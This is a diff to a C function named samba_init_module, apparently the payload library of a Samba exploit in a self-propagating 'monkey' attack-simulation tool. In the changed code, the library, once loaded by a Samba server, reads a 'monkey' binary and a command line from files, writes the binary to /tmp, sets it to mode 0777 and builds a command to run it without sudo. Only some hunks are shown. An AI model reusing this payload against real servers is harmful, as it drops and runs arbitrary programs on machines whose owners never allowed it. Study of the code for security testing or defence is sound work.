@@ -22,16 +22,16 @@ int samba_init_module(void)
 #ifdef ARCH_IS_64
 	const char RUNNER_FILENAME[] = "sc_monkey_runner64.so";
 	const char MONKEY_NAME[] = "monkey64";
-	const char MONKEY_COPY_NAME[] = "monkey64_2";
 #else
 	const char RUNNER_FILENAME[] = "sc_monkey_runner32.so";
 	const char MONKEY_NAME[] = "monkey32";
-	const char MONKEY_COPY_NAME[] = "monkey32_2";
 #endif
 	const char RUNNER_RESULT_FILENAME[] = "monkey_runner_result";
 	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
 	const int ACCESS_MODE = 0777;
-	const char RUN_MONKEY_CMD[] = "sudo ./";
+	const char RUN_MONKEY_CMD[] = "./";
+	const char MONKEY_DEST_FOLDER[] = "/tmp";
+	const char MONKEY_DEST_NAME[] = "monkey";
 	
 	int found = 0;
 	char modulePathLine[LINE_MAX_LENGTH] = {'\0'};
@@ -102,7 +102,7 @@ int samba_init_module(void)
 	
 	// Build commandline
 	strncat(commandline, RUN_MONKEY_CMD, sizeof(RUN_MONKEY_CMD) - 1);
-	strncat(commandline, MONKEY_COPY_NAME, sizeof(MONKEY_COPY_NAME) - 1);
+	strncat(commandline, MONKEY_DEST_NAME, sizeof(MONKEY_DEST_NAME) - 1);
 	strncat(commandline, " ", 1);
 	
 	fread(commandline + strlen(commandline), 1, LINE_MAX_LENGTH, pFile);
@@ -133,7 +133,12 @@ int samba_init_module(void)
 	fread(monkeyBinary, 1, monkeySize, pFile);
 	fclose(pFile);
 	
-	pFile = fopen(MONKEY_COPY_NAME, "wb");
+	if (0 != chdir(MONKEY_DEST_FOLDER))
+	{
+		return 0;
+	}
+	
+	pFile = fopen(MONKEY_DEST_NAME, "wb");
 	if (NULL == pFile)
 	{
 		free(monkeyBinary);
@@ -144,7 +149,7 @@ int samba_init_module(void)
 	free(monkeyBinary);
 	
 	// Change monkey permissions
-    if (0 != chmod(MONKEY_COPY_NAME, ACCESS_MODE))
+    if (0 != chmod(MONKEY_DEST_NAME, ACCESS_MODE))
     {
         return 0;
     }
